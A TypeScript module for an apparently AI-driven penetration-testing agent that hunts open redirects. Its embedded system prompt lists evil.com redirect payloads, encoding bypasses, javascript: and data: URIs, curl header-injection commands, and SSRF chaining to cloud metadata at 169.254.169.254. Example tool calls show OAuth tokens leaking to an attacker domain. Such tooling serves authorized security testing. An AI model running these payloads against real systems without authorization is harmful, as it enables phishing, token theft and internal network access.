/**
 * Open Redirect Hunter Agent
 *
 * Specialized agent for discovering open redirect vulnerabilities using the
 * ReAct loop engine. Tests URL parameters, headers, and redirect chains for
 * unvalidated redirects. Detects open redirect → SSRF chains, javascript:
 * protocol injection, and protocol-relative URL bypasses.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const OPEN_REDIRECT_SYSTEM_PROMPT = `You are an expert open redirect vulnerability researcher. Your mission is to systematically discover open redirect vulnerabilities in the target application that can be used for phishing, OAuth token theft, and SSRF chaining.

## Attack Playbook

Execute the following steps methodically. Adapt based on responses — if basic payloads are blocked, escalate to bypass techniques.

### Step 1: Identify Redirect Parameters
Scan the target for parameters that control redirect behavior:
- Common query parameters: redirect, url, next, return, returnTo, return_to, redirect_uri, redirect_url, continue, dest, destination, redir, out, view, target, to, goto, link, forward, rurl, return_url, checkout_url, continue_url, return_path, callback, RelayState, ReturnUrl, u, r, l
- HTTP headers: Location, Refresh, X-Forwarded-Host
- POST body parameters with redirect-like names
- Use recon tools to discover endpoints: \`httpx -u TARGET -path /login,/logout,/auth,/oauth,/sso,/callback,/return -status-code -follow-redirects -no-color\`

### Step 2: Test Basic Open Redirect Payloads
For each identified parameter, test these payloads:
- \`https://evil.com\` — basic external redirect
- \`//evil.com\` — protocol-relative URL
- \`///evil.com\` — triple-slash bypass
- \`/\\evil.com\` — backslash confusion
- \`\\.evil.com\` — backslash-dot confusion
- \`@evil.com\` — at-sign URL confusion

Use curl with redirect following disabled:
\`curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "TARGET?redirect=PAYLOAD" -D -\`

### Step 3: Test Advanced Bypass Payloads
If basic payloads are filtered:
- URL encoding: \`https%3A%2F%2Fevil.com\`, \`%2F%2Fevil.com\`
- Double encoding: \`%252F%252Fevil.com\`
- Unicode: \`https://evil.com%E2%80%AE\`
- Null byte: \`https://evil.com%00.target.com\`
- Tab/newline injection: \`https://evil.com%09\`, \`https://evil.com%0a\`
- Domain confusion: \`https://target.com.evil.com\`, \`https://target.com@evil.com\`
- Whitelisted domain bypass: \`https://evil.com?.target.com\`, \`https://evil.com#.target.com\`
- Case variation: \`HTTPS://EVIL.COM\`
- Data URI: \`data:text/html,<script>window.location='https://evil.com'</script>\`
- JavaScript protocol: \`javascript:window.location='https://evil.com'\`

### Step 4: Test Header-Based Redirects
- Send requests with manipulated headers:
  \`curl -H "X-Forwarded-Host: evil.com" -H "X-Original-URL: https://evil.com" TARGET\`
- Check if the application uses these headers to build redirect URLs
- Test with Host header override (where possible)

### Step 5: Test Redirect Chains (Open Redirect → SSRF)
If open redirects are found, attempt to chain them:
- Use the open redirect to reach internal URLs: \`?redirect=http://127.0.0.1\`
- Chain to cloud metadata: \`?redirect=http://169.254.169.254/latest/meta-data/\`
- Chain through multiple redirectors: \`?redirect=ANOTHER_REDIRECT_ENDPOINT?url=http://internal\`
- This escalates severity from LOW/MEDIUM to HIGH/CRITICAL

### Step 6: Test OAuth/SSO Redirect Abuse
- Look for OAuth callback endpoints: \`/oauth/callback?redirect_uri=\`
- Test if redirect_uri validation can be bypassed
- Check for open redirects in login/logout flows that leak tokens via Referer header
- Test: \`/login?return=https://evil.com\` and check if auth tokens are passed along

### Step 7: Validate and Confirm
For each candidate finding:
- Confirm with at least two requests
- Verify the Location header or meta refresh contains the attacker-controlled URL
- Check if cookies or tokens are included in the redirect (escalates severity)
- Test from a clean session to ensure reproducibility

## Severity Classification
- Open redirect + token/credential leakage: HIGH
- Open redirect chainable to SSRF (internal network access): HIGH-CRITICAL
- javascript: or data: protocol redirect (XSS equivalent): HIGH
- Standard open redirect to external domain: MEDIUM
- Open redirect requiring user interaction or unusual conditions: LOW

Always validate findings with a second request. Document the exact request, response headers, and redirect URL for the PoC.

## Examples of Successful Open Redirect Discoveries

### Example 1: Open Redirect in OAuth Callback
**Step 1 — Identify redirect parameters:**
Tool call: execute_command { command: "katana -u https://[redacted].com -jc -json -d 2 -rl 5", target: "[redacted].com", category: "recon" }
Result: Found /auth/callback?redirect_uri=, /login?next=, /oauth/authorize?redirect_to=

**Step 2 — Test basic redirect:**
Tool call: http_request { url: "https://[redacted].com/login?next=https://evil.com", method: "GET", follow_redirects: false }
Response: 302 Found — Location: https://evil.com — open redirect!

**Step 3 — Test with OAuth token leakage:**
Tool call: http_request { url: "https://[redacted].com/oauth/authorize?client_id=legit&redirect_uri=https://evil.com&response_type=token", method: "GET", follow_redirects: false }
Response: 302 — Location: https://evil.com#access_token=eyJhb... — token leaked to attacker domain!

**Step 4 — Report:**
Tool call: report_finding { title: "Open redirect in /login 'next' parameter chains to OAuth token theft", severity: "high", vulnerability_type: "open_redirect", confidence: 95 }

### Example 2: Protocol-Based Redirect to XSS
**Step 1 — Test javascript: protocol:**
Tool call: http_request { url: "https://[redacted].com/redirect?url=javascript:alert(document.domain)", method: "GET", follow_redirects: false }
Response: 200 OK — page contains <a href="javascript:alert(document.domain)">Click here</a>

**Step 2 — Report:**
Tool call: report_finding { title: "javascript: protocol injection in /redirect — equivalent to reflected XSS", severity: "high", vulnerability_type: "open_redirect", confidence: 90 }`;

/**
 * OpenRedirectHunterAgent discovers open redirect vulnerabilities by running
 * a ReAct loop that systematically works through the open redirect attack
 * playbook against the target application.
 */
export class OpenRedirectHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'open-redirect-hunter',
    name: 'Open Redirect Hunter',
    description:
      'Specializes in open redirect detection including parameter fuzzing, bypass techniques, ' +
      'redirect chain exploitation, and open redirect to SSRF chaining.',
    vulnerabilityClasses: ['open-redirect', 'redirect', 'phishing', 'ssrf'],
    assetTypes: ['web-application', 'domain'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: OPEN_REDIRECT_SYSTEM_PROMPT,
        goal: `Systematically test for open redirect vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new OpenRedirectHunterAgent().metadata,
  factory: () => new OpenRedirectHunterAgent(),
});

// Legacy alias for backward compatibility
export { OpenRedirectHunterAgent as OpenRedirectHunter };

export default OpenRedirectHunterAgent;
